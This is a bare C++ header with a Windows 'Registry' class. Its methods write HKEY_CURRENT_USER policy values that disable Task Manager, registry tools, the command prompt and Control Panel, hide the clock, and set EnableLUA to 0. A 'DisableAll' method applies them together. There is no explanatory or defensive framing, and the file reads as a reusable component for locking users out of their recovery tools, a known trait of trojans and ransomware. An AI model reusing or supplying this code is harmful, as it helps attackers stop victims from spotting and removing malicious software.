#pragma once

#include <Windows.h>
#include <string>

class Registry {
public:
	Registry() {}
	~Registry() {}

	inline void DisableTaskManager(const bool disable = true) {
		RegistryCreate("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", disable ? 1 : 0);
	}

	inline void DisableRegistryTools(const bool disable = true) {
		RegistryCreate("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", disable ? 1 : 0);
	}

	inline void DisableCMD(const bool disable = true) {
		RegistryCreate("SOFTWARE\\Policies\\Microsoft\\Windows\\System", "DisableCMD", disable ? 1 : 0);
	}

	inline void NoControlPanel(const bool no = true) {
		RegistryCreate("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoControlPanel", no ? 1 : 0);
	}

	inline void HideClock(const bool hide = true) {
		RegistryCreate("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "HideClock", hide ? 1 : 0);
	}

	inline void DisableUAC(const bool disable = true) {
		RegistryCreate("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableLUA", disable ? 0 : 1);
	}

	inline void DisableAll(const bool disableMisc = false) {
		RegistryCreate("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableLUA", 0);
		RegistryCreate("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", 1);
		RegistryCreate("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", 1);
		RegistryCreate("SOFTWARE\\Policies\\Microsoft\\Windows\\System", "DisableCMD", 1);

		if(disableMisc) {
			RegistryCreate("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoControlPanel", 1);
			RegistryCreate("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "HideClock", 1);
		}
	}

private:
	inline void RegistryCreate(const std::string& subKey, const std::string& valueName, const DWORD value) {
		HKEY hkey;
		if(RegCreateKeyExA(HKEY_CURRENT_USER, subKey.c_str(), 0, nullptr, 0, KEY_SET_VALUE, nullptr, &hkey, nullptr) == ERROR_SUCCESS) {
			RegSetValueExA(hkey, valueName.c_str(), 0, REG_DWORD, (PBYTE)&value, sizeof(DWORD));
			RegCloseKey(hkey);
		}
	}
};